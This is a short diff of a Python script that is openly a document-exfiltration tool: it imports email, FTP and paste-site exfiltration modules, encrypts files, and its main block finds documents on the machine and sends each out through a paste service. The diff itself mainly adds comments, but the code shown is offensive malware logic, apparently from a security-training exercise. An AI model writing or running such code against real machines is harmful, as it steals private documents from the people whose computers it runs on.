@@ -1,4 +1,10 @@
+'''
+Put everything together!
+'''
+# Import needed packages
 from cryptor import encrypt, decrypt
+
+# Import needed Python files
 from email_exfil import outlook, plain_email
 from transmit_exfil import plain_ftp, transmit
 from paste_exfil import ie_paste, plain_paste
@@ -27,7 +33,7 @@ def exfiltrate(document_path, method):
             contents = f0.read() 
         with open(filename, 'wb') as f1:
             f1.write(encrypt(contents))
-        
+
         EXFIL[method](filename)
         os.unlink(filename)
     else:
@@ -37,8 +43,7 @@ def exfiltrate(document_path, method):
         contents = encrypt(contents)
         EXFIL[method](title, contents)
 
+# Execute
 if __name__ == '__main__':
     for fpath in find_docs():
         exfiltrate(fpath, 'plain_paste')
-
-   
